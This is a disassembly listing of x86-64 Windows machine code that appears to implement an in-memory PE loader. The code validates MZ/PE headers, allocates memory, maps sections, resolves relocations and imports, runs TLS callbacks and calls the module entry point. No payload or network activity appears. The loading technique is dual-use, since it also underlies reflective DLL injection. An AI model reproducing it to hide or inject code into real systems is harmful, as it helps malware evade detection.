    69dc245a:	48 85 c9             	test   %rcx,%rcx
    69dc245d:	48 89 ce             	mov    %rcx,%rsi
    69dc2460:	0f 84 fa 00 00 00    	je     0x69dc2560
    69dc2466:	8b 41 1c             	mov    0x1c(%rcx),%eax
    69dc2469:	85 c0                	test   %eax,%eax
    69dc246b:	0f 85 d4 00 00 00    	jne    0x69dc2545
    69dc2471:	48 8b 4e 50          	mov    0x50(%rsi),%rcx
    69dc2475:	e8 0e 29 00 00       	call   0x69dc4d88
    69dc247a:	48 8b 46 10          	mov    0x10(%rsi),%rax
    69dc247e:	48 85 c0             	test   %rax,%rax
    69dc2481:	74 38                	je     0x69dc24bb
    69dc2483:	8b 56 18             	mov    0x18(%rsi),%edx
    69dc2486:	31 db                	xor    %ebx,%ebx
    69dc2488:	85 d2                	test   %edx,%edx
    69dc248a:	7e 27                	jle    0x69dc24b3
    69dc248c:	0f 1f 40 00          	nopl   0x0(%rax)
    69dc2490:	48 8b 0c d8          	mov    (%rax,%rbx,8),%rcx
    69dc2494:	48 85 c9             	test   %rcx,%rcx
    69dc2497:	0f 84 97 00 00 00    	je     0x69dc2534
    69dc249d:	48 8b 56 58          	mov    0x58(%rsi),%rdx
    69dc24a1:	48 83 c3 01          	add    $0x1,%rbx
    69dc24a5:	ff 56 48             	call   *0x48(%rsi)
    69dc24a8:	8b 56 18             	mov    0x18(%rsi),%edx
    69dc24ab:	48 8b 46 10          	mov    0x10(%rsi),%rax
    69dc24af:	39 da                	cmp    %ebx,%edx
    69dc24b1:	7f dd                	jg     0x69dc2490
    69dc24b3:	48 89 c1             	mov    %rax,%rcx
    69dc24b6:	e8 cd 28 00 00       	call   0x69dc4d88
    69dc24bb:	48 8b 4e 08          	mov    0x8(%rsi),%rcx
    69dc24bf:	4c 8b 66 30          	mov    0x30(%rsi),%r12
    69dc24c3:	48 8b 6e 58          	mov    0x58(%rsi),%rbp
    69dc24c7:	48 85 c9             	test   %rcx,%rcx
    69dc24ca:	74 16                	je     0x69dc24e2
    69dc24cc:	49 89 e9             	mov    %rbp,%r9
    69dc24cf:	41 b8 00 80 00 00    	mov    $0x8000,%r8d
    69dc24d5:	31 d2                	xor    %edx,%edx
    69dc24d7:	41 ff d4             	call   *%r12
    69dc24da:	48 8b 6e 58          	mov    0x58(%rsi),%rbp
    69dc24de:	4c 8b 66 30          	mov    0x30(%rsi),%r12
    69dc24e2:	48 8b 5e 70          	mov    0x70(%rsi),%rbx
    69dc24e6:	48 85 db             	test   %rbx,%rbx
    69dc24e9:	74 2a                	je     0x69dc2515
    69dc24eb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
    69dc24f0:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
    69dc24f4:	31 d2                	xor    %edx,%edx
    69dc24f6:	49 89 e9             	mov    %rbp,%r9
    69dc24f9:	41 b8 00 80 00 00    	mov    $0x8000,%r8d
    69dc24ff:	41 ff d4             	call   *%r12
    69dc2502:	48 8b 3b             	mov    (%rbx),%rdi
    69dc2505:	48 89 d9             	mov    %rbx,%rcx
    69dc2508:	e8 7b 28 00 00       	call   0x69dc4d88
    69dc250d:	48 85 ff             	test   %rdi,%rdi
    69dc2510:	48 89 fb             	mov    %rdi,%rbx
    69dc2513:	75 db                	jne    0x69dc24f0
    69dc2515:	ff 15 f9 9d 00 00    	call   *0x9df9(%rip)        # 0x69dcc314
    69dc251b:	49 89 f0             	mov    %rsi,%r8
    69dc251e:	31 d2                	xor    %edx,%edx
    69dc2520:	48 89 c1             	mov    %rax,%rcx
    69dc2523:	48 83 c4 20          	add    $0x20,%rsp
    69dc2527:	5b                   	pop    %rbx
    69dc2528:	5e                   	pop    %rsi
    69dc2529:	5f                   	pop    %rdi
    69dc252a:	5d                   	pop    %rbp
    69dc252b:	41 5c                	pop    %r12
    69dc252d:	48 ff 25 08 9e 00 00 	rex.W jmp *0x9e08(%rip)        # 0x69dcc33c
    69dc2534:	48 83 c3 01          	add    $0x1,%rbx
    69dc2538:	39 da                	cmp    %ebx,%edx
    69dc253a:	0f 8f 50 ff ff ff    	jg     0x69dc2490
    69dc2540:	e9 6e ff ff ff       	jmp    0x69dc24b3
    69dc2545:	48 8b 06             	mov    (%rsi),%rax
    69dc2548:	45 31 c0             	xor    %r8d,%r8d
    69dc254b:	31 d2                	xor    %edx,%edx
    69dc254d:	48 8b 49 08          	mov    0x8(%rcx),%rcx
    69dc2551:	8b 40 28             	mov    0x28(%rax),%eax
    69dc2554:	48 01 c8             	add    %rcx,%rax
    69dc2557:	ff d0                	call   *%rax
    69dc2559:	e9 13 ff ff ff       	jmp    0x69dc2471
    69dc255e:	66 90                	xchg   %ax,%ax
    69dc2560:	48 83 c4 20          	add    $0x20,%rsp
    69dc2564:	5b                   	pop    %rbx
    69dc2565:	5e                   	pop    %rsi
    69dc2566:	5f                   	pop    %rdi
    69dc2567:	5d                   	pop    %rbp
    69dc2568:	41 5c                	pop    %r12
    69dc256a:	c3                   	ret
    69dc256b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
    69dc2570:	41 57                	push   %r15
    69dc2572:	41 56                	push   %r14
    69dc2574:	41 55                	push   %r13
    69dc2576:	41 54                	push   %r12
    69dc2578:	55                   	push   %rbp
    69dc2579:	57                   	push   %rdi
    69dc257a:	56                   	push   %rsi
    69dc257b:	53                   	push   %rbx
    69dc257c:	48 83 ec 68          	sub    $0x68,%rsp
    69dc2580:	48 8b bc 24 e8 00 00 	mov    0xe8(%rsp),%rdi
    69dc2587:	00 
    69dc2588:	48 83 fa 3f          	cmp    $0x3f,%rdx
    69dc258c:	49 89 cc             	mov    %rcx,%r12
    69dc258f:	4c 89 c5             	mov    %r8,%rbp
    69dc2592:	48 89 94 24 b8 00 00 	mov    %rdx,0xb8(%rsp)
    69dc2599:	00 
    69dc259a:	4c 89 8c 24 c8 00 00 	mov    %r9,0xc8(%rsp)
    69dc25a1:	00 
    69dc25a2:	0f 86 2a 03 00 00    	jbe    0x69dc28d2
    69dc25a8:	66 81 39 4d 5a       	cmpw   $0x5a4d,(%rcx)
    69dc25ad:	0f 85 fd 02 00 00    	jne    0x69dc28b0
    69dc25b3:	48 63 71 3c          	movslq 0x3c(%rcx),%rsi
    69dc25b7:	48 8d 86 08 01 00 00 	lea    0x108(%rsi),%rax
    69dc25be:	48 39 84 24 b8 00 00 	cmp    %rax,0xb8(%rsp)
    69dc25c5:	00 
    69dc25c6:	0f 82 06 03 00 00    	jb     0x69dc28d2
    69dc25cc:	48 01 ce             	add    %rcx,%rsi
    69dc25cf:	81 3e 50 45 00 00    	cmpl   $0x4550,(%rsi)
    69dc25d5:	0f 85 d5 02 00 00    	jne    0x69dc28b0
    69dc25db:	66 81 7e 04 64 86    	cmpw   $0x8664,0x4(%rsi)
    69dc25e1:	0f 85 c9 02 00 00    	jne    0x69dc28b0
    69dc25e7:	44 8b 4e 38          	mov    0x38(%rsi),%r9d
    69dc25eb:	41 f6 c1 01          	test   $0x1,%r9b
    69dc25ef:	0f 85 bb 02 00 00    	jne    0x69dc28b0
    69dc25f5:	0f b7 56 06          	movzwl 0x6(%rsi),%edx
    69dc25f9:	0f b7 46 14          	movzwl 0x14(%rsi),%eax
    69dc25fd:	85 d2                	test   %edx,%edx
    69dc25ff:	48 8d 44 06 18       	lea    0x18(%rsi,%rax,1),%rax
    69dc2604:	0f 84 c6 03 00 00    	je     0x69dc29d0
    69dc260a:	83 ea 01             	sub    $0x1,%edx
    69dc260d:	31 db                	xor    %ebx,%ebx
    69dc260f:	48 8d 14 92          	lea    (%rdx,%rdx,4),%rdx
    69dc2613:	4c 8d 44 d0 28       	lea    0x28(%rax,%rdx,8),%r8
    69dc2618:	eb 19                	jmp    0x69dc2633
    69dc261a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
    69dc2620:	4c 01 ca             	add    %r9,%rdx
    69dc2623:	48 39 d3             	cmp    %rdx,%rbx
    69dc2626:	48 0f 42 da          	cmovb  %rdx,%rbx
    69dc262a:	48 83 c0 28          	add    $0x28,%rax
    69dc262e:	4c 39 c0             	cmp    %r8,%rax
    69dc2631:	74 1c                	je     0x69dc264f
    69dc2633:	8b 48 10             	mov    0x10(%rax),%ecx
    69dc2636:	8b 50 0c             	mov    0xc(%rax),%edx
    69dc2639:	85 c9                	test   %ecx,%ecx
    69dc263b:	74 e3                	je     0x69dc2620
    69dc263d:	01 ca                	add    %ecx,%edx
    69dc263f:	48 39 d3             	cmp    %rdx,%rbx
    69dc2642:	48 0f 42 da          	cmovb  %rdx,%rbx
    69dc2646:	48 83 c0 28          	add    $0x28,%rax
    69dc264a:	4c 39 c0             	cmp    %r8,%rax
    69dc264d:	75 e4                	jne    0x69dc2633
    69dc264f:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
    69dc2654:	ff 15 aa 9c 00 00    	call   *0x9caa(%rip)        # 0x69dcc304
    69dc265a:	8b 54 24 34          	mov    0x34(%rsp),%edx
    69dc265e:	44 8b 7e 50          	mov    0x50(%rsi),%r15d
    69dc2662:	48 8d 42 ff          	lea    -0x1(%rdx),%rax
    69dc2666:	48 f7 da             	neg    %rdx
    69dc2669:	49 01 c7             	add    %rax,%r15
    69dc266c:	48 01 c3             	add    %rax,%rbx
    69dc266f:	49 21 d7             	and    %rdx,%r15
    69dc2672:	48 21 d3             	and    %rdx,%rbx
    69dc2675:	49 39 df             	cmp    %rbx,%r15
    69dc2678:	0f 85 32 02 00 00    	jne    0x69dc28b0
    69dc267e:	48 8b 4e 30          	mov    0x30(%rsi),%rcx
    69dc2682:	41 b9 04 00 00 00    	mov    $0x4,%r9d
    69dc2688:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
    69dc268d:	4c 89 fa             	mov    %r15,%rdx
    69dc2690:	41 b8 00 30 00 00    	mov    $0x3000,%r8d
    69dc2696:	ff d5                	call   *%rbp
    69dc2698:	48 85 c0             	test   %rax,%rax
    69dc269b:	49 89 c5             	mov    %rax,%r13
    69dc269e:	0f 84 7c 02 00 00    	je     0x69dc2920
    69dc26a4:	31 db                	xor    %ebx,%ebx
    69dc26a6:	eb 56                	jmp    0x69dc26fe
    69dc26a8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
    69dc26af:	00 
    69dc26b0:	b9 10 00 00 00       	mov    $0x10,%ecx
    69dc26b5:	e8 b6 26 00 00       	call   0x69dc4d70
    69dc26ba:	48 85 c0             	test   %rax,%rax
    69dc26bd:	49 89 c6             	mov    %rax,%r14
    69dc26c0:	0f 84 8a 02 00 00    	je     0x69dc2950
    69dc26c6:	66 49 0f 6e cd       	movq   %r13,%xmm1
    69dc26cb:	66 48 0f 6e c3       	movq   %rbx,%xmm0
    69dc26d0:	31 c9                	xor    %ecx,%ecx
    69dc26d2:	66 0f 6c c1          	punpcklqdq %xmm1,%xmm0
    69dc26d6:	41 b9 04 00 00 00    	mov    $0x4,%r9d
    69dc26dc:	0f 11 00             	movups %xmm0,(%rax)
    69dc26df:	4c 89 fa             	mov    %r15,%rdx
    69dc26e2:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
    69dc26e7:	41 b8 00 30 00 00    	mov    $0x3000,%r8d
    69dc26ed:	4c 89 f3             	mov    %r14,%rbx
    69dc26f0:	ff d5                	call   *%rbp
    69dc26f2:	48 85 c0             	test   %rax,%rax
    69dc26f5:	49 89 c5             	mov    %rax,%r13
    69dc26f8:	0f 84 e4 01 00 00    	je     0x69dc28e2
    69dc26fe:	4b 8d 44 3d 00       	lea    0x0(%r13,%r15,1),%rax
    69dc2703:	4c 89 ea             	mov    %r13,%rdx
    69dc2706:	48 c1 ea 20          	shr    $0x20,%rdx
    69dc270a:	48 c1 e8 20          	shr    $0x20,%rax
    69dc270e:	48 39 c2             	cmp    %rax,%rdx
    69dc2711:	72 9d                	jb     0x69dc26b0
    69dc2713:	ff 15 fb 9b 00 00    	call   *0x9bfb(%rip)        # 0x69dcc314
    69dc2719:	41 b8 78 00 00 00    	mov    $0x78,%r8d
    69dc271f:	ba 08 00 00 00       	mov    $0x8,%edx
    69dc2724:	48 89 c1             	mov    %rax,%rcx
    69dc2727:	ff 15 07 9c 00 00    	call   *0x9c07(%rip)        # 0x69dcc334
    69dc272d:	48 85 c0             	test   %rax,%rax
    69dc2730:	49 89 c7             	mov    %rax,%r15
    69dc2733:	0f 84 b4 02 00 00    	je     0x69dc29ed
    69dc2739:	4c 89 68 08          	mov    %r13,0x8(%rax)
    69dc273d:	0f b7 46 16          	movzwl 0x16(%rsi),%eax
    69dc2741:	66 48 0f 6e c5       	movq   %rbp,%xmm0
    69dc2746:	0f 16 84 24 c8 00 00 	movhps 0xc8(%rsp),%xmm0
    69dc274d:	00 
    69dc274e:	49 89 7f 58          	mov    %rdi,0x58(%r15)
    69dc2752:	41 0f 11 47 28       	movups %xmm0,0x28(%r15)
    69dc2757:	f3 0f 7e 84 24 d0 00 	movq   0xd0(%rsp),%xmm0
    69dc275e:	00 00 
    69dc2760:	49 89 5f 70          	mov    %rbx,0x70(%r15)
    69dc2764:	66 c1 e8 0d          	shr    $0xd,%ax
    69dc2768:	0f 16 84 24 d8 00 00 	movhps 0xd8(%rsp),%xmm0
    69dc276f:	00 
    69dc2770:	83 e0 01             	and    $0x1,%eax
    69dc2773:	41 0f 11 47 38       	movups %xmm0,0x38(%r15)
    69dc2778:	8b 56 54             	mov    0x54(%rsi),%edx
    69dc277b:	41 89 47 20          	mov    %eax,0x20(%r15)
    69dc277f:	48 8b 84 24 e0 00 00 	mov    0xe0(%rsp),%rax
    69dc2786:	00 
    69dc2787:	48 39 94 24 b8 00 00 	cmp    %rdx,0xb8(%rsp)
    69dc278e:	00 
    69dc278f:	49 89 47 48          	mov    %rax,0x48(%r15)
    69dc2793:	8b 44 24 34          	mov    0x34(%rsp),%eax
    69dc2797:	41 89 47 68          	mov    %eax,0x68(%r15)
    69dc279b:	0f 82 fd 01 00 00    	jb     0x69dc299e
    69dc27a1:	41 b9 04 00 00 00    	mov    $0x4,%r9d
    69dc27a7:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
    69dc27ad:	4c 89 e9             	mov    %r13,%rcx
    69dc27b0:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
    69dc27b5:	ff d5                	call   *%rbp
    69dc27b7:	44 8b 46 54          	mov    0x54(%rsi),%r8d
    69dc27bb:	4c 89 e2             	mov    %r12,%rdx
    69dc27be:	48 89 c1             	mov    %rax,%rcx
    69dc27c1:	e8 9a 25 00 00       	call   0x69dc4d60
    69dc27c6:	48 8b 94 24 b8 00 00 	mov    0xb8(%rsp),%rdx
    69dc27cd:	00 
    69dc27ce:	4c 8d 46 38          	lea    0x38(%rsi),%r8
    69dc27d2:	4c 89 e1             	mov    %r12,%rcx
    69dc27d5:	49 89 c1             	mov    %rax,%r9
    69dc27d8:	49 63 44 24 3c       	movslq 0x3c(%r12),%rax
    69dc27dd:	49 01 c1             	add    %rax,%r9
    69dc27e0:	4d 89 0f             	mov    %r9,(%r15)
    69dc27e3:	4d 89 69 30          	mov    %r13,0x30(%r9)
    69dc27e7:	4d 89 f9             	mov    %r15,%r9
    69dc27ea:	e8 f1 f4 ff ff       	call   0x69dc1ce0
    69dc27ef:	85 c0                	test   %eax,%eax
    69dc27f1:	0f 84 b2 01 00 00    	je     0x69dc29a9
    69dc27f7:	49 8b 0f             	mov    (%r15),%rcx
    69dc27fa:	4c 8b 41 30          	mov    0x30(%rcx),%r8
    69dc27fe:	4c 2b 46 30          	sub    0x30(%rsi),%r8
    69dc2802:	0f 85 b1 01 00 00    	jne    0x69dc29b9
    69dc2808:	41 c7 47 24 01 00 00 	movl   $0x1,0x24(%r15)
    69dc280f:	00 
    69dc2810:	4c 89 f9             	mov    %r15,%rcx
    69dc2813:	e8 38 f0 ff ff       	call   0x69dc1850
    69dc2818:	85 c0                	test   %eax,%eax
    69dc281a:	0f 84 89 01 00 00    	je     0x69dc29a9
    69dc2820:	4c 89 f9             	mov    %r15,%rcx
    69dc2823:	e8 d8 f5 ff ff       	call   0x69dc1e00
    69dc2828:	85 c0                	test   %eax,%eax
    69dc282a:	0f 84 79 01 00 00    	je     0x69dc29a9
    69dc2830:	49 8b 17             	mov    (%r15),%rdx
    69dc2833:	8b 82 d0 00 00 00    	mov    0xd0(%rdx),%eax
    69dc2839:	85 c0                	test   %eax,%eax
    69dc283b:	74 32                	je     0x69dc286f
    69dc283d:	49 8b 77 08          	mov    0x8(%r15),%rsi
    69dc2841:	48 8b 5c 06 18       	mov    0x18(%rsi,%rax,1),%rbx
    69dc2846:	48 85 db             	test   %rbx,%rbx
    69dc2849:	74 24                	je     0x69dc286f
    69dc284b:	48 8b 03             	mov    (%rbx),%rax
    69dc284e:	48 85 c0             	test   %rax,%rax
    69dc2851:	74 1c                	je     0x69dc286f
    69dc2853:	48 83 c3 08          	add    $0x8,%rbx
    69dc2857:	45 31 c0             	xor    %r8d,%r8d
    69dc285a:	ba 01 00 00 00       	mov    $0x1,%edx
    69dc285f:	48 89 f1             	mov    %rsi,%rcx
    69dc2862:	ff d0                	call   *%rax
    69dc2864:	48 8b 03             	mov    (%rbx),%rax
    69dc2867:	48 85 c0             	test   %rax,%rax
    69dc286a:	75 e7                	jne    0x69dc2853
    69dc286c:	49 8b 17             	mov    (%r15),%rdx
    69dc286f:	8b 42 28             	mov    0x28(%rdx),%eax
    69dc2872:	85 c0                	test   %eax,%eax
    69dc2874:	0f 84 5d 01 00 00    	je     0x69dc29d7
    69dc287a:	41 8b 57 20          	mov    0x20(%r15),%edx
    69dc287e:	4c 01 e8             	add    %r13,%rax
    69dc2881:	85 d2                	test   %edx,%edx
    69dc2883:	0f 84 5b 01 00 00    	je     0x69dc29e4
    69dc2889:	45 31 c0             	xor    %r8d,%r8d
    69dc288c:	ba 01 00 00 00       	mov    $0x1,%edx
    69dc2891:	4c 89 e9             	mov    %r13,%rcx
    69dc2894:	ff d0                	call   *%rax
    69dc2896:	85 c0                	test   %eax,%eax
    69dc2898:	0f 84 a0 01 00 00    	je     0x69dc2a3e
    69dc289e:	41 c7 47 1c 01 00 00 	movl   $0x1,0x1c(%r15)
    69dc28a5:	00 
    69dc28a6:	eb 16                	jmp    0x69dc28be
    69dc28a8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
    69dc28af:	00 
    69dc28b0:	b9 c1 00 00 00       	mov    $0xc1,%ecx
    69dc28b5:	45 31 ff             	xor    %r15d,%r15d
    69dc28b8:	ff 15 d6 9a 00 00    	call   *0x9ad6(%rip)        # 0x69dcc394
    69dc28be:	4c 89 f8             	mov    %r15,%rax
    69dc28c1:	48 83 c4 68          	add    $0x68,%rsp
    69dc28c5:	5b                   	pop    %rbx
    69dc28c6:	5e                   	pop    %rsi
    69dc28c7:	5f                   	pop    %rdi
    69dc28c8:	5d                   	pop    %rbp
    69dc28c9:	41 5c                	pop    %r12
    69dc28cb:	41 5d                	pop    %r13
    69dc28cd:	41 5e                	pop    %r14
    69dc28cf:	41 5f                	pop    %r15
    69dc28d1:	c3                   	ret
    69dc28d2:	b9 0d 00 00 00       	mov    $0xd,%ecx
    69dc28d7:	45 31 ff             	xor    %r15d,%r15d
    69dc28da:	ff 15 b4 9a 00 00    	call   *0x9ab4(%rip)        # 0x69dcc394
    69dc28e0:	eb dc                	jmp    0x69dc28be
    69dc28e2:	49 8b 4e 08          	mov    0x8(%r14),%rcx
    69dc28e6:	31 d2                	xor    %edx,%edx
    69dc28e8:	49 89 f9             	mov    %rdi,%r9
    69dc28eb:	41 b8 00 80 00 00    	mov    $0x8000,%r8d
    69dc28f1:	ff 94 24 c8 00 00 00 	call   *0xc8(%rsp)
    69dc28f8:	49 8b 1e             	mov    (%r14),%rbx
    69dc28fb:	4c 89 f1             	mov    %r14,%rcx
    69dc28fe:	e8 85 24 00 00       	call   0x69dc4d88
    69dc2903:	48 85 db             	test   %rbx,%rbx
    69dc2906:	49 89 de             	mov    %rbx,%r14
    69dc2909:	75 d7                	jne    0x69dc28e2
    69dc290b:	b9 0e 00 00 00       	mov    $0xe,%ecx
    69dc2910:	45 31 ff             	xor    %r15d,%r15d
    69dc2913:	ff 15 7b 9a 00 00    	call   *0x9a7b(%rip)        # 0x69dcc394
    69dc2919:	eb a3                	jmp    0x69dc28be
    69dc291b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
    69dc2920:	31 c9                	xor    %ecx,%ecx
    69dc2922:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
    69dc2927:	41 b9 04 00 00 00    	mov    $0x4,%r9d
    69dc292d:	4c 89 fa             	mov    %r15,%rdx
    69dc2930:	41 b8 00 30 00 00    	mov    $0x3000,%r8d
    69dc2936:	ff d5                	call   *%rbp
    69dc2938:	48 85 c0             	test   %rax,%rax
    69dc293b:	49 89 c5             	mov    %rax,%r13
    69dc293e:	0f 85 60 fd ff ff    	jne    0x69dc26a4
    69dc2944:	eb c5                	jmp    0x69dc290b
    69dc2946:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    69dc294d:	00 00 00 
    69dc2950:	31 d2                	xor    %edx,%edx
    69dc2952:	49 89 f9             	mov    %rdi,%r9
    69dc2955:	41 b8 00 80 00 00    	mov    $0x8000,%r8d
    69dc295b:	4c 89 e9             	mov    %r13,%rcx
    69dc295e:	ff 94 24 c8 00 00 00 	call   *0xc8(%rsp)
    69dc2965:	48 85 db             	test   %rbx,%rbx
    69dc2968:	74 a1                	je     0x69dc290b
    69dc296a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
    69dc2970:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
    69dc2974:	31 d2                	xor    %edx,%edx
    69dc2976:	49 89 f9             	mov    %rdi,%r9
    69dc2979:	41 b8 00 80 00 00    	mov    $0x8000,%r8d
    69dc297f:	ff 94 24 c8 00 00 00 	call   *0xc8(%rsp)
    69dc2986:	48 8b 33             	mov    (%rbx),%rsi
    69dc2989:	48 89 d9             	mov    %rbx,%rcx
    69dc298c:	e8 f7 23 00 00       	call   0x69dc4d88
    69dc2991:	48 85 f6             	test   %rsi,%rsi
    69dc2994:	48 89 f3             	mov    %rsi,%rbx
    69dc2997:	75 d7                	jne    0x69dc2970
    69dc2999:	e9 6d ff ff ff       	jmp    0x69dc290b
    69dc299e:	b9 0d 00 00 00       	mov    $0xd,%ecx
    69dc29a3:	ff 15 eb 99 00 00    	call   *0x99eb(%rip)        # 0x69dcc394
    69dc29a9:	4c 89 f9             	mov    %r15,%rcx
    69dc29ac:	45 31 ff             	xor    %r15d,%r15d
    69dc29af:	e8 9c fa ff ff       	call   0x69dc2450
    69dc29b4:	e9 05 ff ff ff       	jmp    0x69dc28be
    69dc29b9:	49 8b 57 08          	mov    0x8(%r15),%rdx
    69dc29bd:	e8 6e f2 ff ff       	call   0x69dc1c30
    69dc29c2:	41 89 47 24          	mov    %eax,0x24(%r15)
    69dc29c6:	e9 45 fe ff ff       	jmp    0x69dc2810
    69dc29cb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
    69dc29d0:	31 db                	xor    %ebx,%ebx
    69dc29d2:	e9 78 fc ff ff       	jmp    0x69dc264f
    69dc29d7:	49 c7 47 60 00 00 00 	movq   $0x0,0x60(%r15)
    69dc29de:	00 
    69dc29df:	e9 da fe ff ff       	jmp    0x69dc28be
    69dc29e4:	49 89 47 60          	mov    %rax,0x60(%r15)
    69dc29e8:	e9 d1 fe ff ff       	jmp    0x69dc28be
    69dc29ed:	31 d2                	xor    %edx,%edx
    69dc29ef:	49 89 f9             	mov    %rdi,%r9
    69dc29f2:	41 b8 00 80 00 00    	mov    $0x8000,%r8d
    69dc29f8:	4c 89 e9             	mov    %r13,%rcx
    69dc29fb:	ff 94 24 c8 00 00 00 	call   *0xc8(%rsp)
    69dc2a02:	48 85 db             	test   %rbx,%rbx
    69dc2a05:	0f 84 00 ff ff ff    	je     0x69dc290b
    69dc2a0b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
    69dc2a10:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
    69dc2a14:	31 d2                	xor    %edx,%edx
    69dc2a16:	49 89 f9             	mov    %rdi,%r9
    69dc2a19:	41 b8 00 80 00 00    	mov    $0x8000,%r8d
    69dc2a1f:	ff 94 24 c8 00 00 00 	call   *0xc8(%rsp)
    69dc2a26:	48 8b 33             	mov    (%rbx),%rsi
    69dc2a29:	48 89 d9             	mov    %rbx,%rcx
    69dc2a2c:	e8 57 23 00 00       	call   0x69dc4d88
    69dc2a31:	48 85 f6             	test   %rsi,%rsi
    69dc2a34:	48 89 f3             	mov    %rsi,%rbx
    69dc2a37:	75 d7                	jne    0x69dc2a10
    69dc2a39:	e9 cd fe ff ff       	jmp    0x69dc290b
    69dc2a3e:	b9 5a 04 00 00       	mov    $0x45a,%ecx
    69dc2a43:	ff 15 4b 99 00 00    	call   *0x994b(%rip)        # 0x69dcc394
    69dc2a49:	e9 5b ff ff ff       	jmp    0x69dc29a9
    69dc2a4e:	66 90                	xchg   %ax,%ax
    69dc2a50:	41 57                	push   %r15
    69dc2a52:	41 56                	push   %r14
    69dc2a54:	41 55                	push   %r13
    69dc2a56:	41 54                	push   %r12
    69dc2a58:	55                   	push   %rbp
    69dc2a59:	57                   	push   %rdi
    69dc2a5a:	56                   	push   %rsi
    69dc2a5b:	53                   	push   %rbx
    69dc2a5c:	48 83 ec 58          	sub    $0x58,%rsp
    69dc2a60:	48 83 fa 3f          	cmp    $0x3f,%rdx
    69dc2a64:	48 89 cf             	mov    %rcx,%rdi
    69dc2a67:	48 89 d5             	mov    %rdx,%rbp
    69dc2a6a:	0f 86 42 03 00 00    	jbe    0x69dc2db2
    69dc2a70:	66 81 39 4d 5a       	cmpw   $0x5a4d,(%rcx)
    69dc2a75:	0f 85 15 03 00 00    	jne    0x69dc2d90
    69dc2a7b:	48 63 71 3c          	movslq 0x3c(%rcx),%rsi
    69dc2a7f:	48 8d 86 08 01 00 00 	lea    0x108(%rsi),%rax
    69dc2a86:	48 39 c2             	cmp    %rax,%rdx
    69dc2a89:	0f 82 23 03 00 00    	jb     0x69dc2db2
    69dc2a8f:	48 01 ce             	add    %rcx,%rsi
    69dc2a92:	81 3e 50 45 00 00    	cmpl   $0x4550,(%rsi)
    69dc2a98:	0f 85 f2 02 00 00    	jne    0x69dc2d90
    69dc2a9e:	66 81 7e 04 64 86    	cmpw   $0x8664,0x4(%rsi)
    69dc2aa4:	0f 85 e6 02 00 00    	jne    0x69dc2d90
    69dc2aaa:	44 8b 46 38          	mov    0x38(%rsi),%r8d
    69dc2aae:	41 f6 c0 01          	test   $0x1,%r8b
    69dc2ab2:	0f 85 d8 02 00 00    	jne    0x69dc2d90
    69dc2ab8:	0f b7 56 06          	movzwl 0x6(%rsi),%edx
    69dc2abc:	0f b7 46 14          	movzwl 0x14(%rsi),%eax
    69dc2ac0:	85 d2                	test   %edx,%edx
    69dc2ac2:	48 8d 44 06 18       	lea    0x18(%rsi,%rax,1),%rax
    69dc2ac7:	0f 84 d7 03 00 00    	je     0x69dc2ea4
    69dc2acd:	83 ea 01             	sub    $0x1,%edx
    69dc2ad0:	31 db                	xor    %ebx,%ebx
    69dc2ad2:	48 8d 14 92          	lea    (%rdx,%rdx,4),%rdx
    69dc2ad6:	4c 8d 4c d0 28       	lea    0x28(%rax,%rdx,8),%r9
    69dc2adb:	eb 16                	jmp    0x69dc2af3
    69dc2add:	0f 1f 00             	nopl   (%rax)
    69dc2ae0:	4c 01 c2             	add    %r8,%rdx
    69dc2ae3:	48 39 d3             	cmp    %rdx,%rbx
    69dc2ae6:	48 0f 42 da          	cmovb  %rdx,%rbx
    69dc2aea:	48 83 c0 28          	add    $0x28,%rax
    69dc2aee:	4c 39 c8             	cmp    %r9,%rax
    69dc2af1:	74 1c                	je     0x69dc2b0f
    69dc2af3:	8b 48 10             	mov    0x10(%rax),%ecx
    69dc2af6:	8b 50 0c             	mov    0xc(%rax),%edx
    69dc2af9:	85 c9                	test   %ecx,%ecx
    69dc2afb:	74 e3                	je     0x69dc2ae0
    69dc2afd:	01 ca                	add    %ecx,%edx
    69dc2aff:	48 39 d3             	cmp    %rdx,%rbx
    69dc2b02:	48 0f 42 da          	cmovb  %rdx,%rbx
    69dc2b06:	48 83 c0 28          	add    $0x28,%rax
    69dc2b0a:	4c 39 c8             	cmp    %r9,%rax
    69dc2b0d:	75 e4                	jne    0x69dc2af3
    69dc2b0f:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
    69dc2b14:	ff 15 ea 97 00 00    	call   *0x97ea(%rip)        # 0x69dcc304
    69dc2b1a:	8b 54 24 24          	mov    0x24(%rsp),%edx
    69dc2b1e:	44 8b 76 50          	mov    0x50(%rsi),%r14d
    69dc2b22:	48 8d 42 ff          	lea    -0x1(%rdx),%rax
    69dc2b26:	48 f7 da             	neg    %rdx
    69dc2b29:	49 01 c6             	add    %rax,%r14
    69dc2b2c:	48 01 c3             	add    %rax,%rbx
    69dc2b2f:	49 21 d6             	and    %rdx,%r14
    69dc2b32:	48 21 d3             	and    %rdx,%rbx
    69dc2b35:	49 39 de             	cmp    %rbx,%r14
    69dc2b38:	0f 85 52 02 00 00    	jne    0x69dc2d90
    69dc2b3e:	48 8b 4e 30          	mov    0x30(%rsi),%rcx
    69dc2b42:	41 b9 04 00 00 00    	mov    $0x4,%r9d
    69dc2b48:	41 b8 00 30 00 00    	mov    $0x3000,%r8d
    69dc2b4e:	4c 89 f2             	mov    %r14,%rdx
    69dc2b51:	4c 8b 3d 6c 98 00 00 	mov    0x986c(%rip),%r15        # 0x69dcc3c4
    69dc2b58:	41 ff d7             	call   *%r15
